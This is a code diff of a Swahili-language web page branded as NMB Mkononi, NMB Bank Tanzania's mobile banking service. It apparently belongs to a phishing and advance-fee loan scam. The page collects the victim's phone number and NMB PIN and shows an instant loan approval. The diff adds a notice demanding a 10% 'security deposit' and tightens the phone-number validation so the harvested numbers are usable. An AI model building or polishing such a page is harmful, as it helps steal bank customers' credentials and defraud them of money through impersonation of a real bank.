@@ -16,7 +16,7 @@
     <div class="header-container">
       <div class="logo-area">
         <span class="bank-badge">NMB MKONONI</span>
-        <h1 class="bank-title">NMB Mkononi</h1>
+        <h1 class="bank-title">NMB Mkononi Tanzania</h1>
       </div>
     </div>
   </header>
@@ -38,7 +38,7 @@
         <div class="input-group">
           <label>Muda wa Mkopo (Miezi)</label>
           <input type="range" id="duration-range" min="3" max="24" value="12">
-          <span id="duration-val">Miezi 12</span>
+          <span id="duration-val" style="font-weight:700; color:var(--primary-blue);">Miezi 12</span>
         </div>
 
         <div class="monthly-display">
@@ -111,8 +111,8 @@
         </div>
         <div class="field">
           <label>Namba ya NMB Mkononi</label>
-          <input type="tel" id="user-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Mfano: 0712345678" required>
-          <small class="hint">Weka namba yako halisi ya simu ya tarakimu 10 ya NMB Mkononi ya Tanzania.</small>
+          <input type="tel" id="user-contact" maxlength="10" pattern="0[0-9]{9}" placeholder="Mfano: 0712345678" required>
+          <small class="hint">Weka namba yako halisi ya simu ya tarakimu 10 inayoanza na 0 (Mfano: 0712345678).</small>
         </div>
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
@@ -146,7 +146,7 @@
 
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
-          <button type="button" id="btn-submit-app" class="primary-btn" disabled>WASILISHA MAOMBI</button>
+          <button type="button" class="primary-btn next-btn" disabled>NEXT</button>
         </div>
       </div>
     </div>
@@ -166,11 +166,11 @@
       <div class="login-header">
         <span class="bank-badge sm">NMB MKONONI</span>
         <h2>Ingiza Namba ya NMB</h2>
-        <p>Weka namba yako ya simu (tarakimu 10) na PIN ya NMB Mkononi ili kuendelea</p>
+        <p>Weka namba yako ya simu (tarakimu 10 inayoanza na 0) na PIN ya NMB Mkononi ili kuendelea</p>
       </div>
       <div class="field">
         <label>Namba ya NMB Mkononi</label>
-        <input type="tel" id="login-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Mfano: 0712345678" required>
+        <input type="tel" id="login-contact" maxlength="10" pattern="0[0-9]{9}" placeholder="Mfano: 0712345678" required>
       </div>
       <div class="field">
         <label>Ingiza PIN ya NMB (Namba 4)</label>
@@ -202,20 +202,67 @@
     </div>
 
     <!-- VIEW 6: SUCCESS -->
-    <div id="view-success" class="card hidden center-card">
-      <div class="success-icon">✓</div>
-      <h2>Hongera!</h2>
-      <p>Mkopo wako umeidhinishwa! Fedha zitatumwa kwenye akaunti yako hivi punde.</p>
+    <div id="view-success" class="card hidden center-card" style="justify-content: flex-start;">
+      <div class="success-header-card">
+        <div class="success-icon">✓</div>
+        <h2>Hongera!</h2>
+        <p>Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+      </div>
+
       <div class="approved-amount-box">
-        <span>KIASI KILICHOPITISHWA</span>
+        <span>KIASI KILICHOIDHINISHWA</span>
         <h3 id="approved-amount-val">TZS 2,500,000</h3>
       </div>
-      <button id="btn-home" class="primary-btn">RUDI MWANZO</button>
+
+      <div class="notice-box">
+        <strong>⚠️ NOTISI YA UZINGATIAJI</strong>
+        Akaunti yako ya NMB Mkononi lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
+      </div>
+
+      <div class="loan-details-section">
+        <h4>📋 Maelezo ya Mkopo</h4>
+        
+        <div class="detail-row-item">
+          <div class="icon-box">💰</div>
+          <div class="text-content">
+            <span>Malipo ya Kila Mwezi</span>
+            <strong id="success-monthly-val">TZS 235,000</strong>
+          </div>
+        </div>
+
+        <div class="detail-row-item">
+          <div class="icon-box">📅</div>
+          <div class="text-content">
+            <span>Muda wa Mkopo</span>
+            <strong id="success-duration-val">Miezi 12</strong>
+          </div>
+        </div>
+
+        <div class="detail-row-item">
+          <div class="icon-box">📊</div>
+          <div class="text-content">
+            <span>Kiwango cha Riba</span>
+            <strong>10% APR</strong>
+          </div>
+        </div>
+      </div>
+
+      <div class="quick-actions-title">Vitendo vya Haraka</div>
+      <button class="action-card-btn" onclick="alert('Huduma ya kuweka fedha ipo tayari')">💰 Weka Fedha</button>
+      <button class="action-card-btn" onclick="alert('Huduma ya kutoa fedha ipo tayari')">🏦 Toa Fedha</button>
+      <button class="action-card-btn" onclick="alert('Taarifa kamili za mkopo zimerekodiwa')">📄 Maelezo ya Mkopo</button>
+
+      <div class="next-steps-footer">
+        <strong>📱 Hatua Zinazofuata:</strong>
+        Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.
+      </div>
+
+      <button id="btn-home" class="primary-btn">🏠 Rudi Nyumbani</button>
     </div>
   </main>
 
   <footer class="bank-footer">
-    <p>&copy; 2026 NMB Tanzania. Haki zote zimehifadhiwa.</p>
+    <p>&copy; 2026 NMB BANK Tanzania. Haki zote zimehifadhiwa.</p>
   </footer>
 
   <script src="script.js"></script>
@@ -232,5 +279,5 @@
     });
   </script>
 </body>
-        </html>
+  </html>
               
